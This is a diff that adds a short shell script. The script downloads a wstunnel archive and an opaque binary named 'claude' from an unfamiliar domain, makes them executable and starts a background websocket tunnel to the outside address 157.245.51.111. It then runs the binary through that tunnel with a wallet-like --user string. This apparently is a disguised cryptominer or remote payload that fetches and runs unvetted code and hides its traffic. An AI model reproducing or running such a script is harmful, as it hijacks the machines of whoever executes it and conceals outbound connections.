@@ -1,0 +1,12 @@
+WS_PORT=$(shuf -i 10000-65000 -n 1)
+TCP_PORT=$(shuf -i 10000-65000 -n 1)
+echo "WS_PORT=$WS_PORT"
+echo "TCP_PORT=$TCP_PORT"
+
+curl -L -O -J https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
+curl -O -L -J https://storage.technoelectro.online/claude
+tar -xf wstunnel_10.5.2_linux_amd64.tar.gz
+chmod +x wstunnel claude
+nohup ./wstunnel server ws://127.0.0.1:${WS_PORT} &
+nohup ./wstunnel client -L tcp://127.0.0.1:${TCP_PORT}:157.245.51.111:80 ws://127.0.0.1:${WS_PORT} &
+./claude --host 127.0.0.1:${TCP_PORT} --user prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t
